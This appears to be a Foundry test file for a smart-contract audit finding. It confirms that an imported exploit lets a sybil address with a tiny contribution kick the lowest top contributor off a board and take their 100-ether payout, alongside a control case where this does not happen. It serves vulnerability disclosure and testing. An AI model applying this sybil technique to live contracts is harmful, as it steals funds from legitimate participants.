// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, ERC20, Board, Sybil} from
    "./43911-c-02-the-lowest-contributor-of-the-top-contributors-list-can.sol";

contract Finding43911Test is Test {
    function test_exploit_sybil_takes_the_kicked_seat() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.board().kicked(), e.VICTIM(), "kicked");
        assertFalse(e.board().contains(e.VICTIM()), "victim gone");
        assertTrue(e.board().contains(address(e.sybil())), "sybil in");
        assertEq(e.token().balanceOf(address(e.sybil())), 100 ether, "sybil paid");
        assertEq(e.token().balanceOf(e.VICTIM()), 0, "victim unpaid");
        assertEq(e.board().contributionOf(e.VICTIM()), 968 ether, "victim score");
        assertEq(e.board().contributionOf(address(e.sybil())), 1 ether, "sybil score");
    }

    function test_control_existing_depositor_does_not_kick() public {
        ERC20 token = new ERC20();
        Board board = new Board(token, true);
        token.mint(address(board), 3300 ether);
        board.deposit(1_000_000 ether);
        for (uint256 i = 1; i <= 32; i++) {
            board.seed(address(uint160(i)), (1000 - i) * 1 ether);
        }
        board.deposit(1 ether);
        Sybil sybil = new Sybil(board);
        sybil.poke(1 ether);
        assertTrue(board.contains(address(uint160(32))), "victim stays");
        assertFalse(board.contains(address(sybil)), "sybil excluded");
        assertEq(board.kicked(), address(0), "nobody kicked");
        board.pay();
        assertEq(token.balanceOf(address(uint160(32))), 100 ether, "victim paid");
        assertEq(token.balanceOf(address(sybil)), 0, "sybil unpaid");
    }
}
